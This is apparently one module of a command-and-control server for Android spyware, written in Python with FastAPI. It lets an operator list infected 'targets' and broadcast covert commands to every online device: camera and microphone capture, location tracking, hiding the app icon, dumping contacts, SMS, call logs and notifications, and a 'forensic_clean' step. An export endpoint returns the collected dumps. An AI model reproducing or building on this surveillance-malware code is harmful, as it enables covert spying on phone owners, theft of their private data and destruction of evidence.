"""API target."""
from __future__ import annotations

import time
from typing import Any

from fastapi import APIRouter, Depends, HTTPException

from . import db, security
from .ws import hub

router = APIRouter(prefix="/api/targets", dependencies=[Depends(security.require_operator)])

BROADCAST = {
    "ping", "info", "locate_once", "locate_start", "locate_stop", "screen_shot",
    "cam_front", "cam_back", "cam_stop", "mic_start", "mic_stop", "toast",
    "open_url", "lock_screen", "vibrate", "hide_icon", "show_icon",
    "dump_contacts", "dump_sms", "dump_calls", "dump_notif", "forensic_clean",
}


def _shape(row: Any) -> dict:
    d = dict(row)
    d["online"] = bool(d.get("online"))
    d["hidden"] = bool(d.get("hidden"))
    if not d.get("source"):
        d["source"] = "apk"
    return d


@router.get("")
async def list_targets(status: str = "all", q: str = "") -> dict:
    sql = "SELECT * FROM targets WHERE 1=1"
    params: list[Any] = []
    if status == "online":
        sql += " AND online=1"
    elif status == "offline":
        sql += " AND online=0"
    elif status == "web":
        sql += " AND source='web'"
    if q:
        sql += " AND (brand LIKE ? OR model LIKE ? OR label LIKE ? OR ip LIKE ? OR id LIKE ?)"
        like = f"%{q}%"
        params += [like, like, like, like, like]
    sql += " ORDER BY online DESC, last_seen DESC LIMIT 500"
    rows = [_shape(r) for r in db.q(sql, params)]
    counts = db.one("SELECT SUM(online) ONL, COUNT(*) TOT FROM targets")
    return {
        "targets": rows,
        "stats": {
            "online": int(counts["ONL"] or 0) if counts else 0,
            "total": int(counts["TOT"] or 0) if counts else 0,
            "now": time.time(),
        },
    }


@router.post("/broadcast")
async def broadcast(body: dict) -> dict:
    ctype = str(body.get("type") or "")
    if ctype not in BROADCAST:
        raise HTTPException(400, f"perintah '{ctype}' tidak boleh broadcast")
    args = body.get("args") or {}
    rows = db.q("SELECT id FROM targets WHERE online=1")
    sent = 0
    for r in rows:
        await hub.command(r["id"], ctype, args)
        sent += 1
    db.audit("broadcast", f"{ctype} :: {sent} target")
    return {"ok": True, "sent": sent}


@router.get("/{target_id}")
async def detail(target_id: str) -> dict:
    row = db.one("SELECT * FROM targets WHERE id=?", (target_id,))
    if row is None:
        raise HTTPException(404, "Target tidak ditemukan")
    cmds = [dict(r) for r in db.q(
        "SELECT * FROM commands WHERE target_id=? ORDER BY created DESC LIMIT 60", (target_id,))]
    return {"target": _shape(row), "commands": cmds, "live": hub.is_online(target_id)}


@router.patch("/{target_id}")
async def patch_target(target_id: str, body: dict) -> dict:
    allowed = {"label": "label", "notes": "notes", "hidden": "hidden"}
    sets: list[str] = []
    params: list[Any] = []
    for key, col in allowed.items():
        if key in body:
            val = body[key]
            if key == "hidden":
                val = 1 if val else 0
            sets.append(f"{col}=?")
            params.append(val)
    if not sets:
        return {"ok": True, "changed": 0}
    params.append(target_id)
    db.x(f"UPDATE targets SET {', '.join(sets)} WHERE id=?", params)
    return {"ok": True, "changed": len(sets)}


@router.delete("/{target_id}")
async def remove_target(target_id: str) -> dict:
    db.x("DELETE FROM targets WHERE id=?", (target_id,))
    return {"ok": True}


@router.get("/{target_id}/export")
async def export_target(target_id: str) -> dict:
    t = db.one("SELECT * FROM targets WHERE id=?", (target_id,))
    if t is None:
        raise HTTPException(404, "Target tidak ditemukan")
    dumps = [dict(r) for r in db.q("SELECT * FROM dumps WHERE target_id=?", (target_id,))]
    cmds = [dict(r) for r in db.q("SELECT * FROM commands WHERE target_id=?", (target_id,))]
    return {"target": dict(t), "dumps": dumps, "commands": cmds}
